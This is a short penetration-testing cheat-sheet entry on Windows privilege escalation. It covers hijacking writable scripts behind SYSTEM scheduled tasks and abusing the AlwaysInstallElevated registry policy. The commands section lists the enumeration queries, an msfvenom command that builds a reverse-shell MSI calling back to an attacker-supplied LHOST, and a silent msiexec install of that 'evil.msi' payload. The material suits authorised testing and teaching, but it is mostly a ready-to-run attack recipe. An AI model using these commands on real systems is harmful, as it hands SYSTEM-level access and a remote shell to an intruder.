# 11.02 Scheduled Tasks AlwaysInstallElevated

> Hijack a writable SYSTEM-owned scheduled task script, or drop an MSI when `AlwaysInstallElevated` is set in both HKLM and HKCU.

## Overview

Scheduled tasks running as SYSTEM with writable scripts = trivial escalation. AlwaysInstallElevated set on both HKLM+HKCU = SYSTEM via msi.

## Steps

- **List tasks** — schtasks /query /fo LIST /v.
- **Check ownership of target script** — icacls.
- **AlwaysInstallElevated** — both reg keys set?

## Commands

### Detect + exploit

```cmd
schtasks /query /fo LIST /v
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```
